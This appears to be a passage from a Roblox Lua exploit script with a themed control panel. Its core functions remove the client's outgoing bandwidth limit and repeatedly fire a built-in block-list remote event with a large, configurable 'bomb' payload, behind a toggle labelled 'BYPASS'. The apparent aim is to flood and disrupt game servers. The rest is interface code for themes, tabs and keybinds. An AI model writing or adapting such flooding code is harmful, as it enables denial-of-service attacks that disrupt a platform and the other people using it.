						local running = Config.Enabled == true
						local bomb = nil
						local spamThread = nil
						local listeningForKey = false
						local listeningForPad = false
						local minimized = Config.Minimized == true
						local shuttingDown = false
						local activePage = "MAIN"
						local pageToken = 0
						local function getCurrentPower()
							return Config.Mode == "Mobile" and Config.MobilePower or Config.Power
						end
						local function formatPower(numericValue)
							if numericValue >= 1000 then
								return string.format("%dK", math.floor(numericValue / 1000 + 0.5))
							end
							return tostring(numericValue)
						end
						local function parsePower(text)
							local cleaned = tostring(text or ""):gsub("%s", ""):lower()
							local numericValue = tonumber(cleaned)
							if not numericValue then
								local short = cleaned:match("^(%d+%.?%d*)k$")
								if short then
									numericValue = tonumber(short) * 1000
								end
							end
							return numericValue
						end
						local function stopSpam()
							running = false
							if spamThread then
								pcall(task.cancel, spamThread)
								spamThread = nil
							end
							bomb = nil
							pcall(function()
								NetworkClient:SetOutgoingKBPSLimit(0)
							end)
						end
						local function startSpam()
							if spamThread then
								pcall(task.cancel, spamThread)
							end
							bomb = buildBomb(getCurrentPower())
							pcall(function()
								NetworkClient:SetOutgoingKBPSLimit(math.huge)
							end)
							spamThread = task.spawn(function()
								while running and not shuttingDown do
									if bomb then
										pcall(function()
											game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
										end)
									end
									task.wait(Config.SpamDelay)
								end
							end)
						end
						local function currentTheme()
							return Themes[Config.Theme] or Themes.IMPULSE
						end
						local function animate(runtimeObject, properties, duration, style, direction)
							local tween = TweenService:Create(
								runtimeObject,
								TweenInfo.new(
									duration or 0.2,
									style or Enum.EasingStyle.Quint,
									direction or Enum.EasingDirection.Out
								),
								properties
							)
							tween:Play()
							return tween
						end
						local function updateButtonStyle()
							local theme = currentTheme()
							ToggleBtn.Text = running and "ENABLED" or "DISABLED"
							StatusLabel.Text = running and "BYPASS ENABLED" or "BYPASS DISABLED"
							HeaderStateText.Text = running and "ACTIVE" or "READY"
							animate(ToggleBtn, {
								BackgroundColor3 = running and theme.Soft or Color3.fromRGB(14, 13, 17),
								TextColor3 = running and theme.Accent or Color3.fromRGB(151, 148, 158),
							}, 0.24)
							animate(ToggleStroke, {
								Color = running and theme.Accent or theme.Dark,
								Transparency = running and 0.05 or 0.42,
							}, 0.24)
							animate(StatusDot, {
								BackgroundColor3 = running and theme.Accent or Color3.fromRGB(87, 84, 93),
							}, 0.24)
							animate(HeaderStateDot, {
								BackgroundColor3 = running and theme.Accent or Color3.fromRGB(87, 84, 93),
							}, 0.24)
							animate(StatusLabel, {
								TextColor3 = running and theme.Accent or Color3.fromRGB(190, 187, 196),
							}, 0.24)
							animate(HeaderStateText, {
								TextColor3 = running and theme.Accent or Color3.fromRGB(160, 157, 167),
							}, 0.24)
						end
						local function applyTheme()
							local theme = currentTheme()
							animate(MainStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(HeaderStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(HeaderStateStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(MinimizeStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(StatusStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(TabBarStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(ThemePreviewStroke, {
								Color = theme.Dark,
							}, 0.3)
							animate(TopRail, {
								BackgroundColor3 = theme.Accent,
							}, 0.3)
							BackGradient.Color = ColorSequence.new({
								ColorSequenceKeypoint.new(0, theme.Soft),
								ColorSequenceKeypoint.new(0.32, Color3.fromRGB(4, 3, 7)),
								ColorSequenceKeypoint.new(1, Color3.fromRGB(1, 1, 2)),
							})
							for _, stroke in ipairs({
								ToggleRowStroke,
								ModeRowStroke,
								KeyRowStroke,
								PadRowStroke,
								PowerRowStroke,
								ThemeRowStroke,
								KeybindStroke,
								GamepadStroke,
								InputStroke,
							}) do
								animate(stroke, {
									Color = theme.Dark,
								}, 0.3)
							end
							for _, edge in ipairs({
								ToggleEdge,
								ModeEdge,
								KeyEdge,
								PadEdge,
								PowerEdge,
								ThemeEdge,
							}) do
								animate(edge, {
									BackgroundColor3 = theme.Accent,
								}, 0.3)
							end
							ThemeButton.Text = Config.Theme
							PreviewName.Text = Config.Theme
							animate(ThemeButton, {
								TextColor3 = theme.Accent,
							}, 0.3)
							animate(ThemeBack, {
								TextColor3 = theme.Accent,
							}, 0.3)
							animate(ThemeNext, {
								TextColor3 = theme.Accent,
							}, 0.3)
							animate(PreviewRail, {
								BackgroundColor3 = theme.Accent,
							}, 0.3)
							animate(PreviewName, {
								TextColor3 = theme.Accent,
							}, 0.3)
							animate(PreviewSwatches[1], {
								BackgroundColor3 = theme.Dark,
							}, 0.3)
							animate(PreviewSwatches[2], {
								BackgroundColor3 = theme.Accent,
							}, 0.3)
							animate(PreviewSwatches[3], {
								BackgroundColor3 = theme.Soft,
							}, 0.3)
							MainTab.TextColor3 = activePage == "MAIN" and theme.Accent or Color3.fromRGB(132, 129, 139)
							ControlsTab.TextColor3 = activePage == "CONTROLS" and theme.Accent
								or Color3.fromRGB(132, 129, 139)
							VisualTab.TextColor3 = activePage == "VISUAL" and theme.Accent
								or Color3.fromRGB(132, 129, 139)
							MainTab.BackgroundColor3 = activePage == "MAIN" and theme.Soft or Color3.fromRGB(9, 8, 12)
							ControlsTab.BackgroundColor3 = activePage == "CONTROLS" and theme.Soft
								or Color3.fromRGB(9, 8, 12)
							VisualTab.BackgroundColor3 = activePage == "VISUAL" and theme.Soft
								or Color3.fromRGB(9, 8, 12)
							local pcMode = Config.Mode == "PC"
							PCModeButton.BackgroundColor3 = pcMode and theme.Soft or Color3.fromRGB(14, 13, 17)
							PCModeButton.TextColor3 = pcMode and theme.Accent or Color3.fromRGB(139, 136, 146)
							MobileModeButton.BackgroundColor3 = not pcMode and theme.Soft or Color3.fromRGB(14, 13, 17)
							MobileModeButton.TextColor3 = not pcMode and theme.Accent or Color3.fromRGB(139, 136, 146)
							updateButtonStyle()
						end
						local function switchPage(nextName)
							if nextName == activePage then
								return
							end
							pageToken = pageToken + 1
							local token = pageToken
							local pageOrder = {
								MAIN = 1,
								CONTROLS = 2,
								VISUAL = 3,
							}
							local pages = {
								MAIN = MainPage,
								CONTROLS = ControlsPage,
								VISUAL = VisualPage,
							}
							if not pages[nextName] then
								return
							end
							local goingRight = pageOrder[nextName] > pageOrder[activePage]
							local previous = pages[activePage]
							local incoming = pages[nextName]
							activePage = nextName
							incoming.Visible = true
							incoming.Position = UDim2.new(goingRight and 1 or -1, goingRight and 12 or -12, 0, 0)
							animate(previous, {
								Position = UDim2.new(goingRight and -1 or 1, goingRight and -12 or 12, 0, 0),
							}, 0.22)
							animate(incoming, {
								Position = UDim2.fromOffset(0, 0),
							}, 0.26)
							local theme = currentTheme()
							animate(MainTab, {
								BackgroundColor3 = activePage == "MAIN" and theme.Soft or Color3.fromRGB(9, 8, 12),
								TextColor3 = activePage == "MAIN" and theme.Accent or Color3.fromRGB(132, 129, 139),
							}, 0.2)
							animate(ControlsTab, {
								BackgroundColor3 = activePage == "CONTROLS" and theme.Soft or Color3.fromRGB(9, 8, 12),
								TextColor3 = activePage == "CONTROLS" and theme.Accent or Color3.fromRGB(132, 129, 139),
							}, 0.2)
							animate(VisualTab, {
								BackgroundColor3 = activePage == "VISUAL" and theme.Soft or Color3.fromRGB(9, 8, 12),
								TextColor3 = activePage == "VISUAL" and theme.Accent or Color3.fromRGB(132, 129, 139),
							}, 0.2)
							task.delay(0.23, function()
								if token == pageToken then
									previous.Visible = false
									previous.Position = UDim2.fromOffset(0, 0)
								end
							end)
						end
						local function ToggleBypass()
							running = not running
							Config.Enabled = running
							SaveConfig()
							if running then
								startSpam()
							else
								stopSpam()
							end
							updateButtonStyle()
						end
						local function updateModeStyle()
							local theme = currentTheme()
							local pc = Config.Mode == "PC"
							animate(PCModeButton, {
								BackgroundColor3 = pc and theme.Soft or Color3.fromRGB(14, 13, 17),
								TextColor3 = pc and theme.Accent or Color3.fromRGB(139, 136, 146),
							}, 0.2)
							animate(MobileModeButton, {
								BackgroundColor3 = not pc and theme.Soft or Color3.fromRGB(14, 13, 17),
								TextColor3 = not pc and theme.Accent or Color3.fromRGB(139, 136, 146),
							}, 0.2)
							InputBox.Text = formatPower(getCurrentPower())
							PowerStatus.Text = string.upper(Config.Mode) .. "  /  " .. formatPower(getCurrentPower())
						end
						local function setMode(mode)
							if mode ~= "PC" and mode ~= "Mobile" then
								return
							end
							Config.Mode = mode
							updateModeStyle()
							SaveConfig()
							if running then
								startSpam()
							end
						end
						local function UpdatePower(numericValue)
							local numeric = parsePower(numericValue)
							if not numeric then
								InputBox.Text = formatPower(getCurrentPower())
								return
							end
							numeric = math.clamp(math.floor(numeric + 0.5), 1000, 150000)
							if Config.Mode == "Mobile" then
								Config.MobilePower = numeric
							else
								Config.Power = numeric
							end
							InputBox.Text = formatPower(numeric)
							PowerStatus.Text = string.upper(Config.Mode) .. "  /  " .. formatPower(numeric)
							SaveConfig()
							if running then
								startSpam()
							end
						end
						local function stepTheme(direction)
							local index = table.find(ThemeOrder, Config.Theme) or 1
							index = ((index - 1 + direction) % #ThemeOrder) + 1
							Config.Theme = ThemeOrder[index]
							applyTheme()
							SaveConfig()
						end
						ToggleBtn.MouseButton1Click:Connect(ToggleBypass)
						MainTab.MouseButton1Click:Connect(function()
							switchPage("MAIN")
						end)
						ControlsTab.MouseButton1Click:Connect(function()
							switchPage("CONTROLS")
						end)
						VisualTab.MouseButton1Click:Connect(function()
							switchPage("VISUAL")
						end)
						PCModeButton.MouseButton1Click:Connect(function()
							setMode("PC")
						end)
						MobileModeButton.MouseButton1Click:Connect(function()
							setMode("Mobile")
						end)
						ThemeBack.MouseButton1Click:Connect(function()
							stepTheme(-1)
						end)
						ThemeButton.MouseButton1Click:Connect(function()
							stepTheme(1)
						end)
						ThemeNext.MouseButton1Click:Connect(function()
							stepTheme(1)
						end)
						KeybindBtn.MouseButton1Click:Connect(function()
							listeningForPad = false
							listeningForKey = true
							KeybindBtn.Text = "PRESS A KEY"
							KeybindBtn.TextColor3 = currentTheme().Accent
						end)
						GamepadBtn.MouseButton1Click:Connect(function()
							listeningForKey = false
							listeningForPad = true
							GamepadBtn.Text = "PRESS BUTTON"
							GamepadBtn.TextColor3 = currentTheme().Accent
						end)
						UserInputService.InputBegan:Connect(function(input, processed)
							if listeningForPad then
								if
									(
										input.UserInputType == Enum.UserInputType.Gamepad1
										or input.UserInputType == Enum.UserInputType.Gamepad2
									) and GAMEPAD_BUTTONS[input.KeyCode.Name]
								then
									gamepadKeybind = input.KeyCode
									Config.GamepadKeybind = input.KeyCode.Name
									GamepadBtn.Text = Config.GamepadKeybind
									GamepadBtn.TextColor3 = Color3.fromRGB(206, 203, 212)
									listeningForPad = false
									SaveConfig()
								end
								return
							end
							if listeningForKey and input.UserInputType == Enum.UserInputType.Keyboard then
								Config.Keybind = input.KeyCode.Name
								KeybindBtn.Text = Config.Keybind
								KeybindBtn.TextColor3 = Color3.fromRGB(206, 203, 212)
								listeningForKey = false
								SaveConfig()
								return
							end
							if processed then
								return
							end
							if
								input.UserInputType == Enum.UserInputType.Keyboard
								and input.KeyCode.Name == Config.Keybind
							then
								playSound(true)
								ToggleBypass()
							elseif
								(
									input.UserInputType == Enum.UserInputType.Gamepad1
									or input.UserInputType == Enum.UserInputType.Gamepad2
								) and input.KeyCode == gamepadKeybind
							then
								playSound(true)
								ToggleBypass()
							end
						end)
						InputBox:GetPropertyChangedSignal("Text"):Connect(function()
							local filtered = InputBox.Text:gsub("[^%d%.kK]", "")
							if filtered ~= InputBox.Text then
								InputBox.Text = filtered
							end
						end)
